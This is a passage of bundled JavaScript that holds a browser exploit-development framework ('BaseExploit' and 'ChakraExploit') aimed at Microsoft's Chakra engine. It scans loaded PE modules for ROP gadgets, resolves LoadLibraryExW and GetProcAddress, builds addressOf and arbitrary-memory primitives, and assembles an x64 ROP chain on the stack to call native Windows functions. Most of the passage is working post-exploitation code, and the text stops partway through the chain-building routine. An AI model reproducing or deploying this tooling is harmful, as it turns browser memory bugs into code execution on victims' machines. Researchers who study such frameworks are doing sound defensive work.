     * @function
     * @param {number|!Integer} numBits Number of bits
     * @returns {!Integer} Shifted Integer
     */
    IntegerPrototype.shr = IntegerPrototype.shiftRight;

    /**
     * Returns this Integer with bits logically shifted to the right by the given amount.
     * @param {number|!Integer} numBits Number of bits
     * @returns {!Integer} Shifted Integer
     */
    IntegerPrototype.shiftRightUnsigned = function shiftRightUnsigned(numBits) {
        if (isInteger(numBits))
            numBits = numBits.toInt();
        numBits &= 63;
        if (numBits === 0)
            return this;
        else {
            var high = this.high;
            if (numBits < 32) {
                var low = this.low;
                return fromBits((low >>> numBits) | (high << (32 - numBits)), high >>> numBits, this.unsigned, this.size);
            } else if (numBits === 32)
                return fromBits(high, 0, this.unsigned, this.size);
            else
                return fromBits(high >>> (numBits - 32), 0, this.unsigned, this.size);
        }
    };

    /**
     * Returns this Integer with bits logically shifted to the right by the given amount. This is an alias of {@link Integer#shiftRightUnsigned}.
     * @function
     * @param {number|!Integer} numBits Number of bits
     * @returns {!Integer} Shifted Integer
     */
    IntegerPrototype.shru = IntegerPrototype.shiftRightUnsigned;

    /**
     * Converts this Integer to signed.
     * @returns {!Integer} Signed long
     */
    IntegerPrototype.toSigned = function toSigned() {
        if (!this.unsigned)
            return this;
        return fromBits(this.low, this.high, false, this.size);
    };

    /**
     * Converts this Integer to unsigned.
     * @returns {!Integer} Unsigned long
     */
    IntegerPrototype.toUnsigned = function toUnsigned() {
        if (this.unsigned)
            return this;
        return fromBits(this.low, this.high, true, this.size);
    };

    /**
     * Converts this Integer to its byte representation.
     * @param {boolean=} le Whether little or big endian, defaults to big endian
     * @returns {!Array.<number>} Byte representation
     */
    IntegerPrototype.toBytes = function(le) {
        return le ? this.toBytesLE() : this.toBytesBE();
    }

    /**
     * Converts this Integer to its little endian byte representation.
     * @returns {!Array.<number>} Little endian byte representation
     */
    IntegerPrototype.toBytesLE = function() {
        var hi = this.high,
            lo = this.low;
        return [
             lo         & 0xff,
            (lo >>>  8) & 0xff,
            (lo >>> 16) & 0xff,
            (lo >>> 24) & 0xff,
             hi         & 0xff,
            (hi >>>  8) & 0xff,
            (hi >>> 16) & 0xff,
            (hi >>> 24) & 0xff
        ];
    }

    /**
     * Converts this Integer to its big endian byte representation.
     * @returns {!Array.<number>} Big endian byte representation
     */
    IntegerPrototype.toBytesBE = function() {
        var hi = this.high,
            lo = this.low;
        return [
            (hi >>> 24) & 0xff,
            (hi >>> 16) & 0xff,
            (hi >>>  8) & 0xff,
             hi         & 0xff,
            (lo >>> 24) & 0xff,
            (lo >>> 16) & 0xff,
            (lo >>>  8) & 0xff,
             lo         & 0xff
        ];
    }

    return Integer;
})();

/* harmony default export */ __webpack_exports__["a"] = (Integer);


/***/ }),
/* 1 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0_integer__ = __webpack_require__(0);


/**
 * Constructs a base exploit that provides useful data types and utility functions.
 *
 * @class A base exploit class for browser exploit development.
 * @param {number} bitness The bitness of the target process.
 * @constructor
 */
function BaseExploit(bitness) {
    // in bytes
    var DEFAULT_ALIGNMENT = bitness / 8;
    var POINTER_SIZE = bitness / 8;

    var libraries = {};
    var strings = [];
    var exploit = this;

    function cString(s) {
        var ss = '';
        for (var i = 0; i < s.length / 2 + 2; i++) {
            ss += String.fromCharCode((s.charCodeAt(i*2)|0) + ((s.charCodeAt(i*2+1)|0) << 8));
        }
        return wString(ss);
    }

    function wString(s) {
        strings.push(s);
        parseInt(s);
        return exploit.addressOfString(s);
    }

    function getProcAddress(library, procName) {
        var addr = exploit.call(toIntMax(exploit.GetProcAddress), toIntMax(library), toIntMax(cString(procName)));
        if (addr == 0) {
            throw 'missing import ' + procName;
        }
        return addr;
    }

    function loadLibrary(dllName) {
        if (exploit.LoadLibraryA !== undefined) {
            return exploit.call(toIntMax(exploit.LoadLibraryA), toIntMax(cString(dllName)));
        } else if (exploit.LoadLibraryW !== undefined) {
            return exploit.call(toIntMax(exploit.LoadLibraryW), toIntMax(wString(dllName)));
        } else if (exploit.LoadLibraryExA !== undefined) {
            return exploit.call(toIntMax(exploit.LoadLibraryExA), toIntMax(cString(dllName)), toIntMax(0), toIntMax(0));
        } else if (exploit.LoadLibraryExW !== undefined) {
            return exploit.call(toIntMax(exploit.LoadLibraryExW), toIntMax(wString(dllName)), toIntMax(0), toIntMax(0));
        } else {
            throw 'missing load library address';
        }
    }

    /**
     * Loads a DLL (if not loaded already) and finds the given export.
     * @instance
     * @memberof BaseExploit
     * @param {string} dllName The name of DLL to find the function from.
     * @param {string} funcName The name of function to import.
     * @param {Type} returnType The type of the function return.
     * @returns {function}
     */
    function importFunction(dllName, funcName, returnType) {
        returnType = returnType || null;
        if (libraries[dllName] === undefined) {
            libraries[dllName] = loadLibrary(dllName);
        }
        return new FunctionType(returnType).cast(getProcAddress(libraries[dllName], funcName));
    }

    var pointerProxyHandler = {
        get: function(target, property) {
            try {
                var idx = parseInt(property);
            } catch (e) {
                return target[property];
            }
            if (isNaN(idx)) {
                return target[property];
            } else {
                return target.add(idx).load();
            }
        },
        set: function(target, property, value) {
            try {
                var idx = parseInt(property);
            } catch (e) {
                target[property] = value;
            }
            if (isNaN(idx)) {
                target[property] = value;
            } else {
                target.add(idx).store(value);
            }
        },
    };

    /**
     * Constructs a pointer to a certain type.
     *
     * @param {Type} base type
     * @param {Integer} address
     * @instance
     * @memberof BaseExploit
     * @class
     * @constructor
     */
    function Pointer(type, address) {
        this.type = type;
        this.address = address;
        return new Proxy(this, pointerProxyHandler);
    }
    Pointer.prototype = {};
    /**
     * Returns a new pointer with result of pointer arithmetic.
     *
     * @param {Integer|number} x addend
     * @returns {Pointer}
     */
    Pointer.prototype.add = function (x) {
        return new Pointer(this.type, this.address.add(toIntMax(x).mul(this.type.size)));
    };
    /**
     * Returns the value stored at the pointer address. Alternatively, array syntax is supported.
     *
     * @returns {Integer|Pointer}
     */
    Pointer.prototype.load = function () {
        return this.type.load(this.address);
    };
    /**
     * Stores the value at the pointer address. Alternatively, array syntax is supported.
     *
     * @param {Integer|Pointer} value
     */
    Pointer.prototype.store = function (x) {
        return this.type.store(this.address, x);
    };
    /**
     * Converts the Pointer to a hexadecimal string.
     *
     * @returns {string}
     */
    Pointer.prototype.toString = function () {
        return '&0x' + this.address.toString(16);
    };
    /**
     * Returns whether address is zero.
     *
     * @returns {boolean}
     */
    Pointer.prototype.isNull = function () {
        return this.address.eq(0);
    };

    /** Constructs a pointer to a C string. 
     *
     * @param {string} s A string to make into a C string.
     * @instance
     * @memberof BaseExploit
     * @augments Pointer
     * @class
     * @constructor
     */
    function CString(s) {
        return Pointer.call(this, Uint8, cString(s));
    }
    CString.prototype = Object.create(Pointer.prototype);
    CString.prototype.constructor = CString;

    /**
     * Constructs a pointer to a UTF-16 string.
     * @param {string} s A string to make into a UTF-16 string.
     * @instance
     * @memberof BaseExploit
     * @augments Pointer
     * @class
     * @constructor
     */
    function WString(s) {
        return Pointer.call(this, Uint16, wString(s));
    }
    WString.prototype = Object.create(Pointer.prototype);
    WString.prototype.constructor = WString;

    /**
     * Type base class. Internal.
     * @instance
     * @memberof BaseExploit
     * @class
     * @constructor
     */
    function Type() {
    }
    Type.prototype = {
        /**
         * Constructs a PointerType of this type.
         *
         * @returns {PointerType}
         */
        get Ptr () {
            if (!this._ptr) {
                this._ptr = new PointerType(this);
            }
            return this._ptr;
        }
    };
    Type.prototype.constructor = Type;

    /**
     * Constructs a pointer type.
     * @param {Type} base Base type
     * @instance
     * @memberof BaseExploit
     * @augments Type
     * @class
     * @constructor
     */
    function PointerType(base) {
        Type.call(this);
        this.baseType = base;
        this.alignment = POINTER_SIZE;
        this.size = POINTER_SIZE;
    }
    PointerType.prototype = Object.create(Type.prototype);
    PointerType.prototype.constructor = PointerType;
    /**
     * Create a pointer to the given address with our base type.
     *
     * @param {Integer|Pointer} x Memory address
     * @returns {Pointer}
     */
    PointerType.prototype.cast = function (x) {
        x = toIntMax(x);
        if (this.baseType instanceof ArrayType) {
            return new Pointer(this.baseType.baseType, new __WEBPACK_IMPORTED_MODULE_0_integer__["a" /* default */](x.low, x.high, true, POINTER_SIZE * 8));
        } else if (this.baseType instanceof StructType) {
            return new StructPointer(this.baseType, new __WEBPACK_IMPORTED_MODULE_0_integer__["a" /* default */](x.low, x.high, true, POINTER_SIZE * 8));
        } else {
            return new Pointer(this.baseType, new __WEBPACK_IMPORTED_MODULE_0_integer__["a" /* default */](x.low, x.high, true, POINTER_SIZE * 8));
        }
    }
    PointerType.prototype.load = function (address) {
        return this.cast(exploit.read(address, POINTER_SIZE * 8));
    }
    PointerType.prototype.store = function (address, x) {
        return exploit.write(address, toIntMax(x), POINTER_SIZE * 8);
    }

    /**
     * Constructs a function pointer type.
     * @param {Type} returnType Type of return value
     * @instance
     * @memberof BaseExploit
     * @augments Type
     * @class
     * @constructor
     */
    function FunctionType(returnType) {
        Type.call(this);
        this.returnType = returnType;
    }
    FunctionType.prototype = Object.create(Type.prototype);
    FunctionType.prototype.constructor = FunctionType;
    /**
     * Create a function pointer with the given address. Can be called like a Javascript function.
     *
     * @param {Integer|Pointer} x Memory address
     * @returns {function}
     */
    FunctionType.prototype.cast = function (ptr) {
        var returnType = this.returnType || null;
        var f = function(...args) {
            var result = exploit.call(ptr, ...args);
            if (returnType) {
                result = returnType.cast(result);
            }
            return result;
        };
        f.address = ptr;
        f.toString = function() {
            return '&0x' + this.address.toString(16);
        };
        return f;
    }

    var structPointerProxyHandler = {
        get: function(target, property) {
            var offset = target.type.offsets[property];
            if (offset !== undefined) {
                var t = target.type.types[property];
                var p = new PointerType(t).cast(target.address.add(offset));
                if (t instanceof ArrayType || t instanceof StructType) {
                    return p;
                }
                return p.load();
            } else {
                try {
                    var idx = parseInt(property);
                } catch (e) {
                    return target[property];
                }
                if (isNaN(idx)) {
                    return target[property];
                } else {
                    return target.add(idx);
                }
            }
        },
        set: function(target, property, value) {
            var offset = target.type.offsets[property];
            if (offset !== undefined) {
                var t = target.type.types[property];
                if (t instanceof StructType) {
                    throw 'cannot set struct field';
                }
                var p = new PointerType(t).cast(target.address.add(offset));
                p.store(value);
            } else {
                try {
                    var idx = parseInt(property);
                } catch (e) {
                    target[property] = value;
                }
                if (isNaN(idx)) {
                    target[property] = value;
                } else {
                    throw 'cannot set struct via array syntax';
                }
            }
        },
    };
    /**
     * Constructs a pointer to a structure type. Internal.
     *
     * @param {Type} base type
     * @param {Integer} address
     * @instance
     * @memberof BaseExploit
     * @class
     * @constructor
     */
    function StructPointer(type, address) {
        this.type = type;
        this.address = address;
        return new Proxy(this, structPointerProxyHandler);
    }
    StructPointer.prototype = {};
    StructPointer.prototype.add = function (x) {
        return new StructPointer(this.type, this.address.add(toIntMax(x).mul(this.type.size)));
    };
    StructPointer.prototype.toString = function () {
        return '&0x' + this.address.toString(16);
    };
    /**
     * Constructs a structure type.
     * @param {Array} fields Description of structure's fields
     * @param {integer} [alignment] Override default alignment
     * @instance
     * @memberof BaseExploit
     * @augments Type
     * @class
     * @constructor
     */
    function StructType(fields, alignment) {
        Type.call(this);
        alignment = alignment || DEFAULT_ALIGNMENT;
        this.fields = fields;

        this.alignment = 0;
        this.offsets = {};
        this.types = {};
        var offset = 0;
        for (var i = 0; i < fields.length; i++) {
            var name = fields[i][0], type = fields[i][1];
            if (this.offsets[name] !== undefined) {
                throw 'duplicate field name';
            }
            var a = Math.min(alignment, type.alignment);
            this.alignment = Math.max(this.alignment, a);
            if (offset % a) {
                offset += a - (offset % a);
            }
            this.offsets[name] = offset;
            this.types[name] = type;
            offset += type.size;
        }
        if (offset == 0) {
            throw 'empty struct';
        }
        if (offset % this.alignment) {
            offset += this.alignment - (offset % this.alignment);
        }
        this.size = offset;
    }
    StructType.prototype = Object.create(Type.prototype);
    StructType.prototype.constructor = StructType;

    /**
     * Constructs an array type.
     * @param {Type} base Base type
     * @param {integer} length Number of array elements
     * @instance
     * @memberof BaseExploit
     * @augments Type
     * @class
     * @constructor
     */
    function ArrayType(base, length) {
        Type.call(this);
        this.baseType = base;
        this.length = length;
        this.alignment = this.baseType.alignment;
        this.size = this.length * this.baseType.size;
    }
    ArrayType.prototype = Object.create(Type.prototype);
    ArrayType.prototype.constructor = ArrayType;
    ArrayType.prototype.load = function (address) {
        var result = new Array(this.length);
        var size = this.baseType.size;
        for (var i = 0; i < this.length; i++) {
            result[i] = this.baseType.load(address);
            address = address.add(size);
        }
        return result;
    }
    ArrayType.prototype.store = function (address, x) {
        var size = this.baseType.size;
        for (var i = 0; i < x.length; i++) {
            this.baseType.store(address, x[i]);
            address = address.add(size);
        }
    }

    /**
     * Constructs an integer type. Internal. Use predefined Int and Uint type objects.
     * @param {integer} bits Bit size
     * @param {boolean} signed Whether signed or not
     * @instance
     * @memberof BaseExploit
     * @augments Type
     * @class
     * @constructor
     */
    function IntType(bits, signed) {
        Type.call(this);
        this.bits = bits;
        this.signed = signed;
        this.alignment = bits / 8;
        this.size = bits / 8;
    }
    IntType.prototype = Object.create(Type.prototype);
    IntType.prototype.constructor = IntType;
    IntType.prototype.cast = function (x) {
        x = toIntMax(x);
        return new __WEBPACK_IMPORTED_MODULE_0_integer__["a" /* default */](x.low, x.high, !this.signed, this.bits);
    }
    IntType.prototype.load = function (address) {
        return this.cast(exploit.read(address, this.bits));
    }
    IntType.prototype.store = function (address, x) {
        return exploit.write(address, toIntMax(x), this.bits);
    }

    /** 
     * @instance
     * @memberof BaseExploit
     * @member {IntType}
     */
    var Int8 = new IntType(8, true);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {IntType}
     */
    var Int16 = new IntType(16, true);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {IntType}
     */
    var Int32 = new IntType(32, true);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {IntType}
     */
    var Int64 = new IntType(64, true);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {IntType}
     */
    var Uint8 = new IntType(8, false);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {IntType}
     */
    var Uint16 = new IntType(16, false);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {IntType}
     */
    var Uint32 = new IntType(32, false);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {IntType}
     */
    var Uint64 = new IntType(64, false);

    /** 
     * @instance
     * @memberof BaseExploit
     * @member {PointerType}
     */
    var Int8Ptr = new PointerType(Int8);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {PointerType}
     */
    var Int16Ptr = new PointerType(Int16);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {PointerType}
     */
    var Int32Ptr = new PointerType(Int32);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {PointerType}
     */
    var Int64Ptr = new PointerType(Int64);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {PointerType}
     */
    var Uint8Ptr = new PointerType(Uint8);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {PointerType}
     */
    var Uint16Ptr = new PointerType(Uint16);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {PointerType}
     */
    var Uint32Ptr = new PointerType(Uint32);
    /** 
     * @instance
     * @memberof BaseExploit
     * @member {PointerType}
     */
    var Uint64Ptr = new PointerType(Uint64);

    function toIntMax(x) {
        if ('object' !== typeof x) {
            return __WEBPACK_IMPORTED_MODULE_0_integer__["a" /* default */].fromValue(x);
        } else if (x instanceof Pointer || x instanceof StructPointer) {
            return new __WEBPACK_IMPORTED_MODULE_0_integer__["a" /* default */](x.address.low, x.address.high);
        } else if (x instanceof __WEBPACK_IMPORTED_MODULE_0_integer__["a" /* default */]) {
            return new __WEBPACK_IMPORTED_MODULE_0_integer__["a" /* default */](x.low, x.high);
        } else {
            throw 'unhandled type';
        }
    }

    Object.assign(this, {
        importFunction,
        Pointer,
        CString,
        WString,
        ArrayType,
        FunctionType,
        PointerType,
        StructType,
        Integer: __WEBPACK_IMPORTED_MODULE_0_integer__["a" /* default */],
        Int8,
        Int16,
        Int32,
        Int64,
        Uint8,
        Uint16,
        Uint32,
        Uint64,
        Int8Ptr,
        Int16Ptr,
        Int32Ptr,
        Int64Ptr,
        Uint8Ptr,
        Uint16Ptr,
        Uint32Ptr,
        Uint64Ptr,
    });
}
BaseExploit.prototype = {};
/**
 * Find the beginning of a PE module given any address in the module.
 *
 * @param {Integer} address Any address in the PE module
 * @returns {Integer}
 */
BaseExploit.prototype.findModuleBase = function (address) {
    address.low &= 0xFFFF0000; // align to 64kb-boundary
    while (true) {
        var p = this.Uint8Ptr.cast(address);
        if (p[0] == 0x4D && p[1] == 0x5A) {
            var peOffset = this.Uint32Ptr.cast(p.add(0x3C))[0];
            if (peOffset < 0x1000 && p[peOffset] == 0x50 && p[peOffset.add(1)] == 0x45) {
                return address;
            }
        }
        address = address.sub(0x10000);
    }
}
/**
 * Find a set of bytes in a PE module.
 *
 * @param {Integer|Pointer} module Base address of PE module
 * @param {Array} bytes Bytes to locate
 * @returns {Integer}
 */
BaseExploit.prototype.findGadget = function (module, bytes) {
    var p = this.Uint8Ptr.cast(module);
    var peOffset = this.Uint32Ptr.cast(p.add(0x3C))[0];
    var imageSize = this.Uint32Ptr.cast(module.add(peOffset))[20];
    var bytesLength = bytes.length;
    var firstByte = bytes[0];
    for (var i = 0x1000; i < imageSize; i++) {
        if ((i % 4) == 0) {
            // Optimization: check for first byte within current 4 bytes
            var x = this.Uint32Ptr.cast(p.add(i))[0].low;
            if (((x >>> 0) & 0xFF) != firstByte &&
              ((x >>> 8) & 0xFF) != firstByte &&
              ((x >>> 16) & 0xFF) != firstByte &&
              ((x >>> 24) & 0xFF) != firstByte) {
                i += 3;
                continue;
            }
        }
        for (var j = 0; j < bytesLength; j++) {
            if (bytes[j] != p[i + j]) {
                break;
            }
        }
        if (j == bytesLength) {
            return p.add(i);
        }
        i += j;
    }
    return null;
}
/**
 * Find multiple sets of bytes in a PE module.
 *
 * @param {Integer|Pointer} module Base address of PE module
 * @param {Array} query Array of gadgets to find
 * @returns {object}
 */
BaseExploit.prototype.findGadgets = function (module, query) {
    var p = this.Uint8Ptr.cast(module);
    var peOffset = this.Uint32Ptr.cast(p.add(0x3C))[0];
    var codeSize = this.Uint32Ptr.cast(module.add(peOffset))[7];
    var array = new Int32Array(codeSize / 4);
    var address = p.address.add(0x1000);
    for (var i = 0x1000; i < codeSize; i += 8) {
        var x = this.read(address, 64);
        array[i / 4] = x.low;
        array[i / 4 + 1] = x.high;
        address.low += 8;
    }

    var byteArray = new Uint8Array(array.buffer);
    var gadgets = {};
    query.forEach((gadget) => {
        var name = gadget[0], bytes = gadget[1];
        var idx = 0;
        while (true) {
            idx = byteArray.indexOf(bytes[0], idx);
            if (idx < 0) {
                throw 'missing gadget ' + name;
            }
            for (var j = 1; j < bytes.length; j++) {
                if (byteArray[idx + j] != bytes[j]) {
                    break;
                }
            }
            if (j == bytes.length) {
                break;
            }
            idx++;
        }
        gadgets[name] = p.add(idx);
    });
    return gadgets;
}

/* harmony default export */ __webpack_exports__["a"] = (BaseExploit);


/***/ }),
/* 2 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0_baseexploit__ = __webpack_require__(1);
/* harmony import */ var __WEBPACK_IMPORTED_MODULE_1_integer__ = __webpack_require__(0);



/**
 * Constructs an exploit with sensible defaults for Chakra. Child must call initChakra method once read and write methods are available.
 *
 * @augments BaseExploit
 * @class
 * @constructor
 */
function ChakraExploit() {
    var exploit = this;
    __WEBPACK_IMPORTED_MODULE_0_baseexploit__["a" /* default */].call(this, 64);

    /**
     * Constructs a thread using a Web Worker. The worker script must create a {@link ChakraThreadExploit} object.
     *
     * @memberof ChakraExploit
     * @instance
     * @class
     * @constructor
     */
    function Thread(url) {
        var worker = new Worker(url);
        worker.onmessage = (e) => {
            if (e.data == 'CHAKRA_EXPLOIT') {
                var stackLimit = exploit.globalListFirst.load()[exploit.threadContextStackLimit];
                // Default stack size of web worker
                //   1 MB
                var stackSize = 1 * 1024 * 1024;
                var stackTop = stackLimit.sub(0xc000).add(stackSize);
                var stk = exploit.Uint64Ptr.cast(stackTop).add(-1);
                while (!new __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */](0x41424344, 0x10000).eq(stk.load())) {
                    stk = stk.add(-1);
                    if (stk.address <= stackTop.sub(0x10000)) {
                        throw 'unable to find canary';
                    }
                }
                var worker = exploit.Uint64Ptr.cast(stk[1]);
                var manager = exploit.Uint64Ptr.cast(stk[2]);
                manager[7] = worker;
            } else if (this.onmessage) {
                return this.onmessage(e);
            }
        }
        /**
         * @memberof ChakraExploit#Thread
         * @instance
         * @function onmessage
         */
        this.onmessage = null;
        /**
         * postMessage to web worker
         * @function
         */
        this.postMessage = worker.postMessage.bind(worker);
    }
    this.Thread = Thread;
}
ChakraExploit.prototype = Object.create(__WEBPACK_IMPORTED_MODULE_0_baseexploit__["a" /* default */].prototype);
ChakraExploit.prototype.constructor = ChakraExploit;
/**
 * Initializes Chakra helpers using memory read and write.
 *
 * @param {Integer|Pointer} vtable Any address in the chakra DLL
 */
ChakraExploit.prototype.initChakra = function (vtable) {
    this.chakraBase = this.findModuleBase(vtable);

    var gadgets = [
        ['callLoadLibraryExW', [0x48, 0x8B, 0xC8, 0x33, 0xD2, 0x41, 0xB8, 0x00, 0x08, 0x00, 0x00, 0xFF, 0x15]],
        ['jmpGetProcAddress', [0x48, 0x8B, 0xC1, 0x48, 0x8B, 0x49, 0x08, 0x48, 0x85, 0xC9, 0x74, 0x0B, 0x48, 0x83, 0xC4, 0x28, 0x48, 0xFF, 0x25]],
        ['nopReturn', [0xC3]],
        ['popRaxReturn', [0x58, 0xC3]],
        ['popRcxReturn', [0x59, 0xC3]],
        ['popRdxReturn', [0x5A, 0xC3]],
        ['popRspReturn', [0x5C, 0xC3]],
        ['popRbpReturn', [0x5D, 0xC3]],
        ['popRsiReturn', [0x5E, 0xC3]],
        ['addRsp58Return', [0x48, 0x83, 0xC4, 0x58, 0xC3]],
        ['storeRaxAtRdxReturn', [0x48, 0x89, 0x02, 0xC3]],
        ['entrySlice', [0x8B, 0xF8, 0x41, 0x83, 0xFC, 0x02]],
        ['amd64CallFunction', [0x4C, 0x8B, 0x4E, 0x08, 0x4C, 0x8B, 0x06, 0x48, 0x83, 0xEC, 0x20, 0xFF, 0xD0, 0x48, 0x8B, 0xE5, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3]],
        ['linkToBeginningThreadContext', [0x48, 0x8B, 0xC4, 0x4C, 0x89, 0x40, 0x18, 0x48, 0x89, 0x50, 0x10, 0x48, 0x89, 0x48, 0x08, 0x48, 0x83, 0x61]],
    ];
    this.gadgets = this.findGadgets(this.chakraBase, gadgets);
    // initialize ThreadContext information
    this.threadContextPrev = this.gadgets.linkToBeginningThreadContext[18] / 8;
    this.threadContextNext = this.gadgets.linkToBeginningThreadContext[30] / 8;
    this.globalListFirst = new this.PointerType(this.Uint64Ptr).cast(this.Uint64.cast(this.gadgets.linkToBeginningThreadContext).add(27).add(this.Int32Ptr.cast(this.gadgets.linkToBeginningThreadContext.add(23))[0]));
    var p = this.globalListFirst[0];
    for (var i = 0;; i++) {
        if ((p[i] & 0xffff) == 0xc000) {
            break;
        }
    }
    this.threadContextStackLimit = i;
    // initialize LoadLibraryExW and GetProcAddress
    var p = this.gadgets.callLoadLibraryExW.add(17).add(this.Int32Ptr.cast(this.gadgets.callLoadLibraryExW.add(13)).load());
    this.LoadLibraryExW = new this.PointerType(this.Uint8Ptr).cast(p).load();
    var p = this.gadgets.jmpGetProcAddress.add(23).add(this.Int32Ptr.cast(this.gadgets.jmpGetProcAddress.add(19)).load());
    this.GetProcAddress = new this.PointerType(this.Uint8Ptr).cast(p).load();
    // initialize stackTop
    this.findStackTop();
    // initialize support for fast addressOf
    this.locateArray = [{}];
    this.locateArrayPtr = new this.PointerType(this.Uint64Ptr).cast(this.addressOfSlow(this.locateArray))[5].add(3);
    if (!this.addressOfSlow(this.locateArray[0]).address.eq(this.locateArrayPtr[0])) {
        throw 'init of addressOf failed!'
    }
}
/**
 * Returns the address of a Javascript object.
 *
 * @param {*} obj Any Javascript object
 * @returns {Pointer}
 */
ChakraExploit.prototype.addressOf = function (obj) {
    this.locateArray[0] = obj;
    return this.locateArrayPtr[0];
}
/**
 * Returns the address of a string. Points to the string's bytes.
 *
 * @param {string} s A Javascript string
 * @returns {Pointer}
 */
ChakraExploit.prototype.addressOfString = function (s) {
    return this.Uint64Ptr.cast(this.addressOf(s).add(0x10)).load();
}
ChakraExploit.prototype.findStackTop = function () {
    if (this.stackTop === undefined) {
        // Default stack size of browser tab
        //  10 MB
        // Default stack size of web worker
        //   1 MB
        if ('undefined' !== typeof WorkerGlobalScope) {
            var stackLimit = this.globalListFirst.load()[this.threadContextStackLimit];
            var stackSize = 1 * 1024 * 1024;
        } else {
            var stackLimit = this.globalListFirst.load()[this.threadContextStackLimit];
            var stackSize = 10 * 1024 * 1024;
        }
        var stackTop = stackLimit.sub(0xc000).add(stackSize);
        this.stackTop = stackTop;
    }
}
/**
 * Returns the address of a Javascript object. Internal.
 *
 * @param {*} obj Any Javascript object
 * @returns {Pointer}
 */
ChakraExploit.prototype.addressOfSlow = function (obj) {
    var address;
    eval('String.prototype.slice').call('', {
        valueOf: () => {
            var gadgets = this.gadgets;
            var stk = this.Uint64Ptr.cast(this.stackTop).add(-1);
            while (!this.Uint64.cast(gadgets.entrySlice).eq(stk.load())) {
                stk = stk.add(-1);
                if (stk.address <= this.stackTop.sub(0x10000)) {
                    throw 'unable to find entrySlice';
                }
            }
            while (!this.Uint64.cast(gadgets.amd64CallFunction).add(13).eq(stk.load())) {
                stk = stk.add(1);
                if (stk.address >= this.stackTop) {
                    throw 'unable to find amd64CallFunction';
                }
            }
            while (!stk[0].eq(new __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */](0x42424242, 0x10000)) || !stk[2].eq(new __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */](0x41414141, 0x10000))) {
                stk = stk.add(1);
                if (stk.address >= this.stackTop) {
                    throw 'unable to find canaries';
                }
            }
            address = this.Uint8Ptr.cast(stk[1]);
        }
    }, 0, 0, 0, obj, 0x42424242, obj, 0x41414141);
    return address;
}
ChakraExploit.prototype.customInt32Array = function (address) {
    var i32 = new Int32Array(1);
    var p = this.Uint64Ptr.cast(this.addressOf(i32));
    p[4] = 0x7FFFFFFF;
    p[7] = address;
    return i32;
}
/**
 * Call a function pointer with the given arguments. Used internally by FunctionPointer.
 *
 * @param {Integer} address
 * @param {...Integer} args
 * @returns {Integer}
 */
ChakraExploit.prototype.call = function (address, ...args) {
    if (args.length > 10) {
        throw 'too many arguments';
    }
    var returnValAddr;
    eval('String.prototype.slice').call('', {
        valueOf: () => {
            var gadgets = this.gadgets;
            var amd64CallFunction = this.Uint64.cast(gadgets.amd64CallFunction).add(13);
            var entrySlice = this.Uint64.cast(gadgets.entrySlice);
            var stackBottom = this.stackTop.sub(0x10000);
            var stk = this.customInt32Array(stackBottom);
            for (var i = 0x10000 / 8 - 8; i >= 0; i -= 1) {
                if (entrySlice.low == stk[i*2] && entrySlice.high == stk[i*2+1]) {
                    break;
                }
            }
            if (i == 0) {
                throw 'unable to find entrySlice';
            }
            while (amd64CallFunction.low != stk[i*2] || amd64CallFunction.high != stk[i*2+1]) {
                i++;
                if (i == 0x10000 / 8) {
                    throw 'unable to find amd64CallFunction';
                }
            }
            var stk = this.Uint64Ptr.cast(stackBottom.add(i * 8));
            var savedRbpAddr = stk.add(-2);
            stk = stk.add(-0x20000 / 8);
            var i32 = this.customInt32Array(stk);
            // probe stack
            for (var i = 0x20; i >= 0; i--) {
                let x = i32[i * 0x1000 / 4];
            }
            // helper for writing Uint64 to Int32Array
            function write64(i32, i, val) {
                if (val.address) {
                    val = val.address;
                } else {
                    val = __WEBPACK_IMPORTED_MODULE_1_integer__["a" /* default */].fromValue(val);
                }
                i32[i * 2 + 0] = val.low;
                i32[i * 2 + 1] = val.high;
            }
            // ROP chain
            // skip saved rbp, rdi, rsi, rbx
            i = 4;
            // pop r8 and r9 using code in amd64_CallFunction
            write64(i32, i, gadgets.popRsiReturn);
            i++;
            write64(i32, i, stk);
            i++;
            if (args[2] !== undefined)
                write64(i32, 0, args[2]); // r8
            if (args[3] !== undefined)
                write64(i32, 1, args[3]); // r9
            write64(i32, i, gadgets.popRaxReturn);
            i++;
            write64(i32, i, gadgets.nopReturn);
            i++;
            write64(i32, i, gadgets.popRbpReturn);
            i++;
            write64(i32, i, stk.add(i - 2));
            i++;
            write64(i32, i, gadgets.amd64CallFunction);
            i++;
            write64(i32, i, gadgets.popRdxReturn);
            i++;
            if (args[1] !== undefined)
                write64(i32, i, args[1]);
            i++;
            write64(i32, i, gadgets.popRcxReturn);
            i++;
            if (args[0] !== undefined)
                write64(i32, i, args[0]);
            i++;
            write64(i32, i, address);
            i++;
            write64(i32, i, gadgets.addRsp58Return);
            i++;
            i += 4; // skip 0x20 shadow space
            if (args[4] !== undefined)
                write64(i32, i, args[4]);
            i++;
            if (args[5] !== undefined)
                write64(i32, i, args[5]);
            i++;
            if (args[6] !== undefined)
                write64(i32, i, args[6]);
            i++;
            if (args[7] !== undefined)
                write64(i32, i, args[7]);
            i++;
            if (args[8] !== undefined)
                write64(i32, i, args[8]);
            i++;
            if (args[9] !== undefined)
                write64(i32, i, args[9]);
            i++;
            if (args[10] !== undefined)
                write64(i32, i, args[10]);
            i++;
            write64(i32, i, gadgets.popRdxReturn);
            i++;
            write64(i32, i, stk);
            i++;
            write64(i32, i, gadgets.storeRaxAtRdxReturn);
            i++;
